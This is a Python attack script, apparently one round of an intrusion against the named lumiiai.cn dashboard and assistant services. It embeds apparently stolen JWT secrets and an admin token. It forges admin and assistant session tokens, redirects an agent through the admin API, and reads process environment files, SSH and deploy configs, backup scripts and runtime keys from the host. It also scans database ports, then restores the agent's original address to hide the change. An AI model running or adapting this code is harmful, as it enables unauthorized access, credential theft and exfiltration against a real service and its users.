#!/usr/bin/env python3
# i29136 round4: center /proc env (full .env.dev) + sshd_config.d + deploy configs + assistant JWT/runtimes + DB ports
import os, sys, json, time, base64, hmac, hashlib, subprocess, re, socket
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
A_HOST = "assistant.lumiiai.cn"
A_SECRETS = ["297b8a491bc1920b918d01de77166556d3f835f473968c6b", "ce4bc6b0c0ab05a849adf046d57dbf11a98386d7e6804315"]
A_SUB = "usr_ZxLewKrgbRYSm7rWDtQX8"
A_ORG = "org_bTLzxtBLmugV8uxx4QTyw"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
ORIG_IP = "52.53.251.49"

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v): print("R:%s:%s" % (k, _b(v)), flush=True)

def curl(args, timeout=30):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout
    except Exception as e:
        return -1, repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, host=HOST, timeout=25,
         maxlen=8000, extra_headers=None):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    for h in (extra_headers or []): args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET": args += ["-X", method]
    args += ["https://%s%s" % (host, path)]
    rc, out = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt)}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jload(s):
    try: return json.loads(s)
    except Exception: return None
def qp(p): return up.quote(p, safe="/")

def flist(aid, sess, path, timeout=30, maxent=300):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=60000)
    j = jload(r["body"]); ents = []
    if isinstance(j, dict) and isinstance(j.get("entries"), list):
        for e in j["entries"][:maxent]:
            ents.append({"n": e.get("name"), "t": e.get("type"), "s": e.get("size")})
    return r["code"], ents, r["body"][:200]

def fread(aid, sess, path, timeout=30, maxlen=600000):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=maxlen)
    j = jload(r["body"])
    if isinstance(j, dict) and "content" in j:
        return r["code"], j.get("content") or "", j.get("size"), j.get("path")
    return r["code"], None, None, r["body"][:200]

sess = None
# ensure session works (owner)
sess = None
def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer, "role": role,
                         "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig
sess = forge(OWNER)

pr = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": "127.0.0.1"}, timeout=25, maxlen=2000)
R("P1_patch", {"code": pr["code"], "ip": (jload(pr["body"]) or {}).get("ip")})

# ---------- full env of key pids ----------
KEY_PIDS = ["1691114", "1493541", "1493553", "1552884", "3842868", "973644"]
envs = {}
for pid in KEY_PIDS:
    c, env, sz, pth = fread(AID, sess, "/proc/%s/environ" % pid, timeout=25, maxlen=400000)
    if env is not None:
        envs[pid] = {"size": len(env), "all": env}
    else:
        envs[pid] = {"err": str(pth)[:120]}
R("P2_envs", envs)

# all pids: find any with interesting names, dump env if not yet
code, ents, raw = flist(AID, sess, "/proc", timeout=60, maxent=400)
pids = [e["n"] for e in ents if str(e.get("n", "")).isdigit()]
extra = {}
for pid in pids:
    if pid in KEY_PIDS: continue
    c2, cmd, sz, pth = fread(AID, sess, "/proc/%s/cmdline" % pid, timeout=10, maxlen=2000)
    if cmd is None: continue
    cv = cmd.replace("\x00", " ").strip()
    if not re.search(r"(main\.js|sidecar|sandbox|gateway|caddy|lumii|docker|feishu)", cv, re.I): continue
    c3, env, s3, p3 = fread(AID, sess, "/proc/%s/environ" % pid, timeout=20, maxlen=300000)
    extra[pid] = {"cmd": cv[:180], "size": (len(env) if env is not None else None),
                  "all": env if env is not None else str(p3)[:100]}
R("P3_extra_envs", extra)

# ---------- sshd_config.d + deploy configs ----------
misc = {}
c, ents, raw = flist(AID, sess, "/etc/ssh/sshd_config.d", timeout=20)
misc["sshd.d"] = {"code": c, "entries": ents}
for e in ents:
    if e["t"] == "file":
        c2, content, sz, pth = fread(AID, sess, "/etc/ssh/sshd_config.d/" + e["n"], timeout=20)
        misc["sshd.d:" + e["n"]] = (content or "")[:3000]

for f in ("/opt/lumii-prod/deploy/lumii-assistant-sidecar.service",
          "/opt/lumii-prod/deploy/lumii-feishu-ingress@.service",
          "/opt/lumii-prod/deploy/center-docker.sh",
          "/opt/lumii-prod/deploy/feishu-ingress-envs.sh",
          "/opt/lumii-prod/deploy/publish-lak.sh",
          "/opt/lumii-prod/deploy/registry-mirror/install.sh",
          "/opt/lumii-prod-docker/docker-compose.yml",
          "/opt/lumii-prod-docker/docker-compose.override.yml",
          "/opt/lumii-prod-docker/ACTIVE",
          "/home/ubuntu/db_backups/backup-mysql.sh",
          "/home/ubuntu/db_backups/restore.md",
          "/home/ubuntu/lumii-dashboard/DEPLOY.md",
          "/etc/systemd/system/lumii-prod-sidecar-tunnel.service",
          "/etc/systemd/system/lumii-sandbox-relay.service",
          "/etc/systemd/system/lumii-ops-agent.service"):
    c, content, sz, pth = fread(AID, sess, f, timeout=25)
    misc[f] = {"code": c, "size": sz, "content": (content or "")[:5000],
               "err": None if content is not None else str(pth)[:150]}
R("P4_misc", misc)

# ops scripts listing
c, ents, raw = flist(AID, sess, "/opt/lumii-prod/scripts/ops", timeout=25)
R("P5_ops_listing", {"code": c, "entries": ents})

# ---------- assistant JWT + runtimes ----------
def forge_a(secret, sub, org):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": now, "exp": now + 86400 * 7,
                         "sid": "s29136probe", "lgn": now}, separators=(",", ":")))
    sig = b64u(hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

for sec in A_SECRETS:
    atok = forge_a(sec, A_SUB, A_ORG)
    r = call("/api/me", host=A_HOST, extra_headers=["Cookie: lumii_session=" + atok], timeout=25, maxlen=1500)
    R("P6_me_%s" % sec[:8], {"code": r["code"], "body": r["body"][:250]})
    print("me", sec[:8], r["code"], flush=True)
    if r["code"] == "200":
        rr = call("/api/runtimes", host=A_HOST, extra_headers=["Cookie: lumii_session=" + atok], timeout=25, maxlen=6000)
        R("P6_runtimes_%s" % sec[:8], {"code": rr["code"], "body": rr["body"][:1000]})
        pr2 = call("/api/runtimes", method="POST", host=A_HOST, body={"name": "probe-29136", "visibility": "org"},
                   extra_headers=["Cookie: lumii_session=" + atok], timeout=30, maxlen=8000)
        R("P6_create_%s" % sec[:8], {"code": pr2["code"], "body": pr2["body"][:1500]})
        jp = jload(pr2["body"]) or {}
        rid = jp.get("id")
        if rid:
            kr = call("/api/runtimes/keys/current?runtimeId=%s" % rid, host=A_HOST,
                      extra_headers=["Cookie: lumii_session=" + atok], timeout=25, maxlen=4000)
            R("P6_keys_%s" % sec[:8], {"id": rid, "code": kr["code"], "body": kr["body"][:600]})
            tok = jp.get("token") or jp.get("agentToken")
            if tok:
                R("P6_rt_token_%s" % sec[:8], {"id": rid, "token": tok})
        break

# ---------- DB ports ----------
db = {}
for port in (5432, 3306, 3002, 3001, 8788):
    s = socket.socket(); s.settimeout(5); t0 = time.time()
    try:
        s.connect(("122.51.1.87", port)); db[port] = "OPEN %.2fs" % (time.time() - t0)
    except Exception as e:
        db[port] = "ERR " + repr(e)[:60]
    finally:
        s.close()
R("P7_db_ports", db)

# ---------- restore ----------
pr3 = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=25, maxlen=1000)
R("P9_restore", {"code": pr3["code"], "ip": (jload(pr3["body"]) or {}).get("ip")})
print("DONE", flush=True)
